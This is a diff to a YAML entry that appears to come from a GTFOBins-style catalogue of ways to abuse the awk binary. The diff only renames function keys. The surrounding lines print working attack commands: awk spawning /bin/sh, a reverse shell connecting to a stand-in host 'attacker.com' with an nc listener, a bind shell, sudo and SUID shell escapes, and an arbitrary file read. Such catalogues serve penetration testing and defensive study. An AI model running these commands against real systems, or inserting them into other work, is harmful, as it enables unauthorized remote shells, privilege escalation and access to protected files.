@@ -1,8 +1,8 @@
 ---
 functions:
-  execute-interactive:
+  shell:
     - code: awk 'BEGIN {system("/bin/sh")}'
-  reverse-shell-non-interactive:
+  non-interactive-reverse-shell:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
         RHOST=attacker.com
@@ -11,7 +11,7 @@ functions:
             s = "/inet/tcp/0/" RHOST "/" RPORT;
             while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
             while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
-  bind-shell-non-interactive:
+  non-interactive-bind-shell:
     - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
       code: |
         LPORT=12345
@@ -27,8 +27,8 @@ functions:
     - code: |
         LFILE=file_to_read
         awk '//' "$LFILE"
-  sudo-enabled:
+  sudo:
     - code: sudo awk 'BEGIN {system("/bin/sh")}'
-  suid-limited:
+  limited-suid:
     - code: ./awk 'BEGIN {system("/bin/sh")}'
 ---
